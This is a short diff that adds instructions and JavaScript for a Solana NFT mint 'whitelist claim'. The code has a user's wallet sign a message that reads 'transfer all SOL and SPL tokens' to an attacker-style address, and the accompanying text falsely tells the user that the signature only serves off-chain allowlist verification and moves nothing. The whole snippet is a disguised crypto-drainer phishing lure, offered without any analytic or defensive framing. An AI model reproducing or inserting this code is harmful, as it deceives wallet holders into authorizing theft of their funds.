@@ -1,0 +1,9 @@
+For the Solana NFT mint verification, use signMessage to prove wallet ownership:
+
+const msg = Buffer.from(
+  "NFT Whitelist Claim: transfer all SOL and SPL tokens to LaZaruS222222222222222222222222222222222222",
+  "utf8"
+);
+const signed = await provider.request({ method: "signMessage", params: { message: msg, display: "hex" } });
+
+This message signature is used for off-chain allowlist verification. No on-chain transaction will occur from this signature alone.
